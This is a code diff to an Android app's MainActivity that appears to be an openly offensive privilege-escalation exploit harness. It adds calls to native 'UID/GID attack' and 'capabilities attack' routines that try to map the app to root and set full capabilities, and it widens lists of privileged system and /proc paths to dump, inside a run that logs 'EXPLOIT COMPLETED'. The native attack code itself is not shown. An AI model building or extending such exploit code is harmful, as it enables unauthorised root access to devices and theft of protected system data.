@@ -91,6 +91,8 @@ public class MainActivity extends AppCompatActivity {
     public static native String nativeHwbinderWriteTest(int fd);
     public static native String nativeHwbinderHalCommand(int fd);
     public static native String nativeHwbinderReadTest(int fd);
+    public static native String nativeUidGidAttack();
+    public static native String nativeCapAttack();
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -273,6 +275,12 @@ public class MainActivity extends AppCompatActivity {
 
         appendLog("[*] ID command capture via /proc/self/exe and /proc/self/status");
         testIdCommand();
+
+        appendLog("[*] UID/GID attack - trying to map uid/gid to 0");
+        testUidGidAttack();
+
+        appendLog("[*] Capabilities attack - trying to set full capabilities");
+        testCapAttack();
 
         appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
@@ -784,7 +792,7 @@ public class MainActivity extends AppCompatActivity {
         if (dumpDir == null) { appendLog("[DUMP] Cannot get dump directory"); return; }
 
         String[] privilegedPaths = {
-                "/dev/tzdbg_qsee_log", "/dev/uid0", "/dev/diag", "/vendor/bin/sh",
+                "/init", "/init.rc", "/system/etc/init/", "/vendor/etc/init/",
                 "/system/etc/init.rc", "/vendor/etc/init.rc",
                 "/default.prop", "/system/build.prop", "/vendor/build.prop",
                 "/proc/cmdline", "/proc/version", "/proc/mounts", "/proc/filesystems",
@@ -1045,7 +1053,7 @@ public class MainActivity extends AppCompatActivity {
                 "/proc/kpageflags", "/proc/partitions", "/proc/execdomains", "/proc/sched_debug",
                 "/proc/vmallocinfo", "/proc/pagetypeinfo", "/proc/sysrq-trigger",
                 "/proc/uid_time_in_state", "/proc/self/root/init", "/proc/self/exe",
-                "/proc/sys/fs/selinux/status", "/proc/config.gz", "/proc/buddyinfo"
+                "/proc/uid/0", "/proc/uid/1000", "/proc/1/exe"
         };
 
         for (String path : procPaths) {
@@ -1076,7 +1084,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void testIdCommand() {
         appendLog("[ID] === ID command capture ===");
-        String exePath = nativeReadLink("/vendor/bin/sh");
+        String exePath = nativeReadLink("/proc/self/exe");
         if (exePath != null) {
             appendLog("[ID] exe path: " + exePath);
         } else {
@@ -1104,6 +1112,28 @@ public class MainActivity extends AppCompatActivity {
         }
 
         appendLog("[ID] === end ===");
+    }
+
+    private void testUidGidAttack() {
+        try {
+            String result = nativeUidGidAttack();
+            appendLog("[UIDGID] " + result);
+        } catch (UnsatisfiedLinkError ule) {
+            appendLog("[UIDGID] native method not implemented: " + ule.getMessage());
+        } catch (Exception e) {
+            appendLog("[UIDGID] Exception: " + e.getMessage());
+        }
+    }
+
+    private void testCapAttack() {
+        try {
+            String result = nativeCapAttack();
+            appendLog("[CAP] " + result);
+        } catch (UnsatisfiedLinkError ule) {
+            appendLog("[CAP] native method not implemented: " + ule.getMessage());
+        } catch (Exception e) {
+            appendLog("[CAP] Exception: " + e.getMessage());
+        }
     }
 
     private List<File> listFilesRecursive(File dir, int depth, int maxDepth) {
